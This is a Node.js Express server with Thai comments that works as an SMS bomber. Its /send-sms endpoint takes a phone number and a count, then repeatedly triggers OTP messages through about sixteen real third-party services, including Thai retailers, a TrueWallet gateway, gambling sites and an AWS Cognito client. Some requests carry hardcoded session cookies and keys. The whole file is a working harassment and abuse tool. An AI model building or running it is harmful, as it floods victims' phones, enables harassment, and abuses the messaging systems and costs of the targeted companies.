// เรียกใช้ Express, path, bodyParser และ axios
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const axios = require('axios');

// สร้างแอปพลิเคชัน Express
const app = express();

// ตั้งค่าพอร์ตที่เซิร์ฟเวอร์จะทำงาน
const PORT = 5000;

// กำหนดให้ Express ใช้งานไฟล์ HTML, CSS, JS ที่อยู่ในโฟลเดอร์ public
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json()); // ใช้ body-parser เพื่อจัดการกับ JSON body

// ฟังก์ชันส่ง OTP จาก Dataiku
async function sendDataiku(phone) {
    const url = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
    const headers = {
        'Language': 'th-TH',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br'
    };

    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        return `[Dataiku] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Dataiku] ❌ Error: ${error.message}`;
    }
}

// ฟังก์ชันส่ง OTP จาก BigC
async function sendDataiku(phone) {
    const url = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
    const headers = {
        'Language': 'th-TH',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br'
    };

    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        return `[Dataiku] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Dataiku] ❌ Error: ${error.message}`;
    }
}

async function sendBigc(phone) {
    const url = "https://openapi.bigc.co.th/customer/v1/otp";
    const headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Device-Info": "Mozilla/5.0",
        "Language": "th",
        "Origin": "https://www.bigc.co.th",
        "Platform": "web-desktop",
        "Referer": "https://www.bigc.co.th/",
        "User-Agent": "Mozilla/5.0",
        "Version": "1.69.3"
    };
    const data = { phone_no: phone };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[BigC] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[BigC] ❌ Error: ${error.message}`;
    }
}

async function sendLotus(phone) {
    const url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";
    const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    };
    const params = new URLSearchParams({ mobile_phone_no: phone });

    try {
        const response = await axios.post(url, params, { headers, timeout: 5000 });
        return `[Lotus] ✅ OTP ส่งสำเร็จ`;
    } catch (error) {
        return `[Lotus] ❌ Error: ${error.message}`;
    }
}

async function sendSiam191(phone) {
    const url = "https://www.siam191.app/api/user/request-register-tac";
    const data = {
        sendType: "mobile",
        currency: "THB",
        country_code: "66",
        mobileno: phone,
        language: "th",
        langCountry: "th-th"
    };

    try {
        const response = await axios.post(url, data, { timeout: 5000 });
        return `[Siam191] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Siam191] ❌ Error: ${error.message}`;
    }
}

async function sendTruewallet(phone) {
    const url = "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp";
    const headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0",
        "Cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
    };
    const data = `transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone=${phone}`;

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Truewallet] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Truewallet] ❌ Error: ${error.message}`;
    }
}

async function send1112(phone) {
    const url = "https://api2.1112.com/api/v1/otp/create";
    const headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0"
    };
    const data = {
        phonenumber: phone,
        language: "th"
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[1112] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[1112] ❌ Error: ${error.message}`;
    }
}

async function sendCh3plus(phone) {
    const url = "https://api-sso.ch3plus.com/user/request-otp";
    const headers = {
        "User-Agent": "Mozilla/5.0"
    };
    const data = {
        tel: phone,
        type: "login"
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[CH3plus] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[CH3plus] ❌ Error: ${error.message}`;
    }
}

async function sendFox888(phone) {
    const url = "https://lb-api.fox83-sy.xyz/api/otp/register";
    const data = {
        applicant: phone,
        serviceName: "fox888.com"
    };

    try {
        const response = await axios.post(url, data, { timeout: 5000 });
        return `[Fox888] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Fox888] ❌ Error: ${error.message}`;
    }
}

async function sendCognito(phone) {
    const url = "https://cognito-idp.ap-southeast-1.amazonaws.com/";
    const headers = {
        "cache-control": "max-age=0",
        "user-agent": "Mozilla/5.0",
        "content-type": "application/x-amz-json-1.1",
        "x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode"
    };
    const data = {
        ClientId: "6g47av6ddfcvi06v4l186c16d6",
        Username: `+66${phone.slice(1)}`
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Cognito] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Cognito] ❌ Error: ${error.message}`;
    }
}

async function asd(phone) {
    const url = "https://api2.1112.com/api/v1/otp/create";
    const data = {
        phonenumber: phone,
        language: "th"
    };

    const headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0"
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[1112] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[1112] ❌ Error: ${error.message}`;
    }
}

async function sendGiztix(phone) {
    const url = "https://api.giztix.com/graphql";
    const data = {
        operationName: "OtpGeneratePhone",
        variables: {
            phone: `66${phone.slice(1)}`
        },
        query: `
            mutation OtpGeneratePhone($phone: ID!) {
                otpGeneratePhone(phone: $phone) {
                    ref
                    __typename
                }
            }
        `
    };

    const headers = {
        "User-Agent": "Mozilla/5.0"
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Giztix] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Giztix] ❌ Error: ${error.message}`;
    }
}

async function sendKonvy(phone) {
    const url = `https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone=${phone}`;
    
    const headers = {
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0"
    };

    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        return `[Konvy] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Konvy] ❌ Error: ${error.message}`;
    }
}

async function sendAPI(phone) {
    const url = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
    const headers = {
        'Language': 'th-TH',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br'
    };

    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        return `[API] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[API] ❌ Error: ${error.message}`;
    }
}

async function sendOTP(phone) {
    const url = 'https://me-sms.com/api/otp';
    const headers = {
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Cookie': '_gcl_au=1.1.1633389887.1731843365; skcm--ga-universal=true; skcm--ga-4=true; _ga=GA1.2.387541208.1731843369; _gid=GA1.2.63028240.1731843369',
        'Origin': 'https://me-sms.com',
        'Referer': 'https://me-sms.com/register',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = {
        'phone': phone
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[OTP] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[OTP] ❌ Error: ${error.message}`;
    }
}

async function sendRegistrationOTP(phone) {
    const url = 'https://m.gb69.win/api/otp';
    const headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Cookie': 'auth.strategy=local',
        'Origin': 'https://m.gb69.win',
        'Referer': 'https://m.gb69.win/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = {
        'registrera_typ': '',
        'telefon_number': phone
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Registration OTP] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Registration OTP] ❌ Error: ${error.message}`;
    }
}

async function sendAsk4WinOTP(phone) {
    const url = 'https://ask4win.co/api/tiamut/otp';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Cookie': `i18n_redirected=th;__cf_bm=FumcBlo.AEvpRk6Wy72HC2Wk3pxiuuqKUsHOAw.WAFc-1731938192-1.0.1.1-E1tG2Kal4GEN7MWZXDMPiC_yD8O8o_AxVrLjOIMBDwKGPYbXUjDqgGqjHgtcxUDd0tqFZsXjk5k66celuSIAsA; _cfuvid=pn44VIRXrxW2OQgtyCe5mA3RXkOGYeQfnCgHx8VnshQ-1731938215253-0.0.1.1-604800000`,
        'My-Domain': 'ask4win.co',
        'My-Ip': '125.27.208.26, 172.71.81.77',
        'Origin': 'https://ask4win.co',
        'Referer': 'https://ask4win.co/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = {
        'phone': phone
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Ask4Win OTP] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Ask4Win OTP] ❌ Error: ${error.message}`;
    }
}


async function sendOnePlayBetOTP(phone) {
    const url = 'https://api-member.oneplaybet.com/user/register/otp';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://m.7789betpro.com',
        'Referer': 'https://m.7789betpro.com/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = {
        'mobileNumber': phone,
        'partnerKey': 'XPBBKKSBP7BP'
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[OnePlayBet OTP] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[OnePlayBet OTP] ❌ Error: ${error.message}`;
    }
}
async function sendFine36OTP(phone) {
    const url = 'https://fine36.com/api/tiamut/otp';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Cookie': 'i18n_redirected=th; __cf_bm=ehQ0lHqTTlETJljj41UHTuw85G6RMs4CEjOjOzySI2s-1732021818-1.0.1.1-bBJ_Ro6dLIElOXDZf487Iq_SnfPFXxzxQd80wGFNO38vzUiZ_gwSEyIyKNqZ8aw9G31GFUltWhd1UW_Dopbb2g; _cfuvid=a.ROe8ABFUZG7rEgUQBGPclmz0wz1BdUWGEiYINQkKo-1732021828613-0.0.1.1-604800000',
        'My-Domain': 'fine36.com',
        'My-Ip': '125.27.166.114, 172.68.104.157',
        'Origin': 'https://fine36.com',
        'Referer': 'https://fine36.com/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = {
        'phone': phone
    };

    try {
        const response = await axios.post(url, data, { headers, timeout: 5000 });
        return `[Fine36 OTP] ✅ Success: ${response.status}`;
    } catch (error) {
        return `[Fine36 OTP] ❌ Error: ${error.message}`;
    }
}
// เพิ่มฟังก์ชันที่เหลือ (เหมือนกันทุกตัว) เช่น sendSiam191, sendTruewallet, sendFox888 ฯลฯ

// เส้นทาง API ที่ใช้ในการส่ง SMS ตามจำนวนที่กำหนด
app.post('/send-sms', async (req, res) => {
    const { phone, amount } = req.body;

    if (!phone || !amount) {
        return res.status(400).json({ success: false, message: 'กรุณากรอกข้อมูลให้ครบ' });
    }

    const results = [];
    // ส่ง OTP ผ่าน API ต่างๆ
    for (let i = 0; i < amount; i++) {
        const result1 = await sendDataiku(phone);
        const result2 = await sendBigc(phone);
        const result3 = await sendLotus(phone);
        const result4 = await send1112(phone);
        const result5 = await sendSiam191(phone);
        const result6 = await sendTruewallet(phone);
        const result7 = await sendFox888(phone);
        const result8 = await sendCognito(phone);
        const result9 = await sendGiztix(phone);
        const result10 = await sendKonvy(phone);
        const result11 = await sendAPI(phone);
        const result12 = await sendOTP(phone);
        const result13 = await sendRegistrationOTP(phone);
        const result14 = await sendAsk4WinOTP(phone);
        const result15 = await sendOnePlayBetOTP(phone);
        const result16 = await sendFine36OTP(phone);

        results.push(
            result1, result2, result3, result4, result5, result6, result7, result8, result9,
            result10, result11, result12, result13, result14, result15, result16
        );  // เพิ่มผลลัพธ์จาก API ต่างๆ ตามต้องการ
    }

    return res.json({ success: true, message: 'คำขอถูกส่งเรียบร้อยแล้ว', results });
});

// เส้นทางที่เซิร์ฟเวอร์จะให้บริการไฟล์ HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// เริ่มเซิร์ฟเวอร์ที่พอร์ต 5000
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
